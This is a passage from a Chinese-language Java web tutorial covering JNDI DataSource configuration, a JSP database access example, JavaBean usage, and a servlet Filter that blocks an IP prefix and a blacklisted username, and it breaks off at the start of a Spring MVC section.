数据源（DataSource）</h3><p>在真实的Java项目中通常不会使用原生的<code>JDBC</code>的<code>DriverManager</code>去连接数据库，而是使用数据源(<code>javax.sql.DataSource</code>)来代替<code>DriverManager</code>管理数据库的连接。一般情况下在Web服务启动时候会预先定义好数据源，有了数据源程序就不再需要编写任何数据库连接相关的代码了，直接引用<code>DataSource</code>对象即可获取数据库连接了。</p><p>在  <code>META-INF</code> 目录下创建一个 <code>content.xml</code> 文件，在里面定义数据源</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Context</span>  <span class="attr">reloadable</span>=<span class="string">"true"</span> &gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Resource</span> <span class="attr">name</span>=<span class="string">"jdbc/BookDB"</span> <span class="attr">auth</span>=<span class="string">"Container"</span> <span class="attr">type</span>=<span class="string">"javax.sql.DataSource"</span></span></span><br><span class="line"><span class="tag">     <span class="attr">maxActive</span>=<span class="string">"100"</span> <span class="attr">maxIdle</span>=<span class="string">"30"</span> <span class="attr">maxWait</span>=<span class="string">"10000"</span></span></span><br><span class="line"><span class="tag">     <span class="attr">username</span>=<span class="string">"root"</span> <span class="attr">password</span>=<span class="string">"root"</span></span></span><br><span class="line"><span class="tag">     <span class="attr">driverClassName</span>=<span class="string">"com.mysql.jdbc.Driver"</span></span></span><br><span class="line"><span class="tag">     <span class="attr">url</span>=<span class="string">"jdbc:mysql://localhost:3306/BookDB?autoReconnect=true<span class="symbol">&amp;amp;</span>useUnicode=true<span class="symbol">&amp;amp;</span>characterEncoding=GB2312<span class="symbol">&amp;amp;</span>useSSL=false"</span>/&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">Context</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>web.xml</code> 中加入 <code>&lt;resource-ref&gt;</code> 元素</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resource-ref</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">description</span>&gt;</span>DB Connection<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">res-ref-name</span>&gt;</span>jdbc/BookDB<span class="tag">&lt;/<span class="name">res-ref-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">res-type</span>&gt;</span>javax.sql.DataSource<span class="tag">&lt;/<span class="name">res-type</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">res-auth</span>&gt;</span>Container<span class="tag">&lt;/<span class="name">res-auth</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resource-ref</span>&gt;</span></span><br></pre></td></tr></table></figure><p>获取 jdbc/BookDB 数据源引用，并获取连接对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Connection con;</span><br><span class="line"></span><br><span class="line">Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">DataSource ds =(DataSource)ctx.lookup(<span class="string">"java:comp/env/jdbc/BookDB"</span>);</span><br><span class="line">con = ds.getConnection();</span><br></pre></td></tr></table></figure><p>example</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--首先导入一些必要的包--&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.*"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.*"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.sql.*"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"javax.sql.*"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"javax.naming.*"</span>%&gt;</span><br><span class="line">&lt;!--设置中文输出--&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">"text/html; charset=GB2312"</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;TITLE&gt;dbaccess1.jsp&lt;/TITLE&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">  Connection con;</span><br><span class="line">  Statement stmt;</span><br><span class="line">  ResultSet rs;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">//建立数据库连接</span></span><br><span class="line">  Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">  DataSource ds =(DataSource)ctx.lookup(<span class="string">"java:comp/env/jdbc/BookDB"</span>);</span><br><span class="line">  con = ds.getConnection();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//创建一个SQL声明</span></span><br><span class="line">  stmt = con.createStatement();</span><br><span class="line">  <span class="comment">//增加新记录</span></span><br><span class="line">  stmt.executeUpdate(<span class="string">"insert into BOOKS(ID,NAME,TITLE,PRICE) values ('999','Tom','Tomcat Bible',44.5)"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//查询记录</span></span><br><span class="line">  rs = stmt.executeQuery(<span class="string">"select ID,NAME,TITLE,PRICE from BOOKS"</span>);</span><br><span class="line">  <span class="comment">//输出查询结果</span></span><br><span class="line">  out.println(<span class="string">"&lt;table border=1 width=400&gt;"</span>);</span><br><span class="line">  <span class="keyword">while</span> (rs.next())&#123;</span><br><span class="line">    String col1 = rs.getString(<span class="number">1</span>);</span><br><span class="line">    String col2 = rs.getString(<span class="number">2</span>);</span><br><span class="line">    String col3 = rs.getString(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">float</span> col4 = rs.getFloat(<span class="number">4</span>);</span><br><span class="line">    </span><br><span class="line">     <span class="comment">//打印所显示的数据</span></span><br><span class="line">    out.println(<span class="string">"&lt;tr&gt;&lt;td&gt;"</span>+col1+<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>+col2+<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>+col3+<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>+col4+<span class="string">"&lt;/td&gt;&lt;/tr&gt;"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  out.println(<span class="string">"&lt;/table&gt;"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//删除新增加的记录</span></span><br><span class="line">  stmt.executeUpdate(<span class="string">"delete from BOOKS where ID='999'"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//关闭结果集、SQL声明、数据库连接</span></span><br><span class="line">  rs.close();</span><br><span class="line">  stmt.close();</span><br><span class="line">  con.close();</span><br><span class="line">&#125;<span class="keyword">catch</span> (Exception e) &#123;out.println(e.getMessage());e.printStackTrace();&#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="5-JavaBean"><a href="#5-JavaBean" class="headerlink" title="5 JavaBean"></a>5 JavaBean</h2><p>JavaBean 是特殊的 Java 类，使用 Java 语言书写，并且遵守 JavaBean API 规范，是一种可重复使用、且跨平台的软件组件。</p><ul><li>提供一个默认的无参构造函数。</li><li>需要被序列化并且实现了 Serializable 接口。</li><li>可能有一系列可读写属性。</li><li>可能有一系列的 getter 或 <strong>setter</strong> 方法。</li></ul><p>JavaBean 示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> mypack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StudentsBean</span> <span class="keyword">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">private</span> String firstName = <span class="keyword">null</span>;</span><br><span class="line">   <span class="keyword">private</span> String lastName = <span class="keyword">null</span>;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">int</span> age = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">StudentsBean</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">getFirstName</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">return</span> firstName;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">getLastName</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">return</span> lastName;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">return</span> age;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setFirstName</span><span class="params">(String firstName)</span></span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.firstName = firstName;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLastName</span><span class="params">(String lastName)</span></span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.lastName = lastName;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.age = age;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译后的 .class 文件存放在 <code>/WEB_INF/classes/mypack/</code> 中</p><ol><li>导入 JavaBean 类</li></ol><p>要想访问，首先需要导入：<code>&lt;%@ page import=&quot;mypack.StudentsBean&quot;%&gt;</code></p><ol start="2"><li>声明 JavaBean 对象</li></ol><p>使用 <code>&lt;jsp:useBean&gt;</code> 来声明：<code>&lt;jsp:useBean id=&quot;myBean&quot; class=&quot;mypack.StudentsBean&quot; scope=&quot;session&quot;/&gt;</code></p><p><code>&lt;jsp:useBean&gt;</code> 属性：</p><ul><li><p>id: 命名引用该Bean的变量。如果能够找到id和scope相同的Bean实例，jsp:useBean动作将使用已有的Bean实例而不是创建新的实例。</p></li><li><p>class: 指定Bean的完整包名</p></li><li><p>scope: 指定Bean在哪种上下文内可用，可以取下面的四个值之一：page，request，session和application</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 默认值是page，表示该Bean只在当前页面内可用（保存在当前页面的PageContext内）。 </span><br><span class="line"><span class="number">2.</span> request表示该Bean在当前的客户请求内有效（保存在ServletRequest对象内）。 </span><br><span class="line"><span class="number">3.</span> session表示该Bean对当前HttpSession内的所有页面都有效。 </span><br><span class="line"><span class="number">4.</span> application则表示该Bean对所有具有相同ServletContext的页面都有效。</span><br></pre></td></tr></table></figure></li><li><p>type: 指定引用该对象的变量的类型，它必须是Bean类的名字、超类名字、该类所实现的接口名字之一。请记住变量的名字是由id属性指定的。  </p><p>beanName: 指定Bean的名字。如果提供了type属性和beanName属性，允许省略class属性。</p></li></ul><ol start="3"><li>访问 JavaBean 属性</li></ol><p>1）使用 <code>&lt;jsp:getProperty&gt;</code> 标签</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:getProperty name=<span class="string">"myBean"</span> property=<span class="string">"count"</span> /&gt;</span><br></pre></td></tr></table></figure><p>2）Java表达式</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=myBean.getCount() %&gt;</span><br></pre></td></tr></table></figure><p>3）EL 表达式</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;myBean.count&#125;</span><br></pre></td></tr></table></figure><p>给 JavaBean 属性赋值：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:setProperty name=<span class="string">"myBean"</span> property=<span class="string">"count"</span> value=<span class="string">"1"</span>/&gt;</span><br><span class="line">或</span><br><span class="line">&lt;% myBean.setCount(<span class="number">1</span>);%&gt;</span><br></pre></td></tr></table></figure><h2 id="6-Filter"><a href="#6-Filter" class="headerlink" title="6 Filter"></a>6 Filter</h2><p><code>javax.servlet.Filter</code>是<code>Servlet2.3</code>新增的一个特性,主要用于过滤URL请求，通过Filter我们可以实现URL请求资源权限验证、用户登陆检测等功能。</p><p>Filter是一个接口，实现一个Filter只需要重写<code>init</code>、<code>doFilter</code>、<code>destroy</code>方法即可，其中过滤逻辑都在<code>doFilter</code>方法中实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> mypack;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.*;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">@WebFilter( //用@WebFilter标注配置NoteFilter</span></span><br><span class="line"><span class="comment">filterName = "NoteFilter", </span></span><br><span class="line"><span class="comment">urlPatterns = "/note", </span></span><br><span class="line"><span class="comment">initParams = &#123;</span></span><br><span class="line"><span class="comment">@WebInitParam(name = "ipblock", value = "221.45"),</span></span><br><span class="line"><span class="comment">@WebInitParam(name = "blacklist", value = "捣蛋鬼")&#125;</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NoteFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> FilterConfig config = <span class="keyword">null</span>;</span><br><span class="line">  <span class="keyword">private</span> String blackList=<span class="keyword">null</span>;</span><br><span class="line">  <span class="keyword">private</span> String ipblock=<span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig config)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"NoteFilter: init()"</span>); </span><br><span class="line">    <span class="keyword">this</span>.config = config;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//读取拒绝IP地址</span></span><br><span class="line">    ipblock=config.getInitParameter(<span class="string">"ipblock"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//读取blacklist初始化参数</span></span><br><span class="line">    blackList=config.getInitParameter(<span class="string">"blacklist"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response,</span></span></span><br><span class="line"><span class="function"><span class="params">                     FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    System.out.println(<span class="string">"NoteFilter: doFilter()"</span>); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!checkRemoteIP(request,response))<span class="keyword">return</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!checkUsername(request,response))<span class="keyword">return</span>;</span><br><span class="line">       </span><br><span class="line">    <span class="comment">//记录响应客户请求前的时间</span></span><br><span class="line">    <span class="keyword">long</span> before = System.currentTimeMillis();</span><br><span class="line">    config.getServletContext().log(<span class="string">"NoteFilter:before call chain.doFilter()"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//把请求转发给后续的过滤器或者Web组件</span></span><br><span class="line">    chain.doFilter(request, response);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//记录响应客户请求后的时间</span></span><br><span class="line">    config.getServletContext().log(<span class="string">"NoteFilter:after call chain.doFilter()"</span>);</span><br><span class="line">    <span class="keyword">long</span> after = System.currentTimeMillis();</span><br><span class="line">    </span><br><span class="line">    String name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (request <span class="keyword">instanceof</span> HttpServletRequest) &#123;</span><br><span class="line">        name = ((HttpServletRequest)request).getRequestURI();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//记录响应客户请求所花的时间</span></span><br><span class="line">    config.getServletContext().log(<span class="string">"NoteFilter:"</span>+name + <span class="string">": "</span> + (after - before) + <span class="string">"ms"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">checkRemoteIP</span><span class="params">(ServletRequest request, ServletResponse response)</span> </span></span><br><span class="line"><span class="function">                        <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">    <span class="comment">//读取客户的IP地址</span></span><br><span class="line">    String addr=request.getRemoteAddr();</span><br><span class="line">    <span class="keyword">if</span>(addr.indexOf(ipblock)==<span class="number">0</span>)&#123;</span><br><span class="line">      response.setContentType(<span class="string">"text/html;charset=GB2312"</span>);</span><br><span class="line">      PrintWriter out = response.getWriter();</span><br><span class="line">      out.println(<span class="string">"&lt;h1&gt;对不起,服务器无法为你提供服务。&lt;/h1&gt;"</span>);</span><br><span class="line">      out.flush();</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">checkUsername</span><span class="params">(ServletRequest request, ServletResponse response)</span></span></span><br><span class="line"><span class="function">                      <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    String username =((HttpServletRequest) request).getParameter(<span class="string">"username"</span>);</span><br><span class="line">    <span class="keyword">if</span>(username!=<span class="keyword">null</span>)</span><br><span class="line">      username=<span class="keyword">new</span> String(username.getBytes(<span class="string">"ISO-8859-1"</span>),<span class="string">"GB2312"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (username!=<span class="keyword">null</span> &amp;&amp; username.indexOf(blackList) != -<span class="number">1</span>  )  &#123;</span><br><span class="line">      <span class="comment">//生成拒绝用户留言的网页</span></span><br><span class="line">      response.setContentType(<span class="string">"text/html;charset=GB2312"</span>);</span><br><span class="line">      PrintWriter out = response.getWriter();</span><br><span class="line">      out.println(<span class="string">"&lt;h1&gt;对不起,"</span>+username + <span class="string">",你没有权限留言 &lt;/h1&gt;"</span>);</span><br><span class="line">      out.flush();</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"NoteFilter: destroy()"</span>); </span><br><span class="line">    config = <span class="keyword">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Filter</code>的配置类似于<code>Servlet</code>，由<code>&lt;filter&gt;</code>和<code>&lt;filter-mapping&gt;</code>两组标签组成，如果Servlet版本大于3.0同样可以使用注解的方式配置Filter</p><p>web.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>NoteFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>mypack.NoteFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span> </span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>ipblock<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>221.45<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>blacklist<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>捣蛋鬼<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br></pre></td></tr></table></figure><p>使用 <code>@WebFilter</code> 标注</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebFilter</span>( <span class="comment">//用@WebFilter标注配置NoteFilter</span></span><br><span class="line">filterName = <span class="string">"NoteFilter"</span>, </span><br><span class="line">urlPatterns = <span class="string">"/note"</span>, </span><br><span class="line">initParams = &#123;</span><br><span class="line"><span class="meta">@WebInitParam</span>(name = <span class="string">"ipblock"</span>, value = <span class="string">"221.45"</span>),</span><br><span class="line"><span class="meta">@WebInitParam</span>(name = <span class="string">"blacklist"</span>, value = <span class="string">"捣蛋鬼"</span>)&#125;</span><br><span class="line">)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NoteFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br></pre></td></tr></table></figure><p>Filter和Servlet的总结：<a href="https://javasec.org/javaweb/Filter&amp;Servlet/" target="_blank" rel="noopener">https://javasec.org/javaweb/Filter&amp;Servlet/</a></p><h2 id="7-序列化"><a href="#7-序列化" class="headerlink" title="7 序列化"></a>7 序列化</h2><h2 id="8-XML"><a href="#8-XML" class="headerlink" title="8 XML"></a>8 XML</h2><h2 id="9-MVC-设计模式"><a href="#9-MVC-设计模式" class="headerlink" title="9 MVC 设计模式"></a>9 MVC 设计模式</h2><p>spring MVC 工作流程</p><ol><li>用户向服务端发送一次请求，这个请求会先到前端控制器DispatcherServlet(也叫中央控制器)。</li><li>DispatcherServlet接收到请求后会调用HandlerMapping处理器映射器。由此得知，该请求该由哪个Controller来处理（并未调用Controller，只是得知）</li><li>DispatcherServlet调用HandlerAdapter处理器适配器，告诉处理器适配器应该要去执行哪个Controller</li><li>HandlerAdapter处理器适配器去执行Controller并得到ModelAndView(数据和视图)，并层层返回给DispatcherServlet</li><li>DispatcherServlet将ModelAndView交给ViewReslover视图解析器解析，然后返回真正的视图。</li><li>DispatcherServlet将模型数据填充到视图中</li><li>DispatcherServlet将结果响应给用户</li></ol><p>lib 文件夹中必须包含 Spring 软件包的依赖</p><p>web.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:xsi</span>=<span 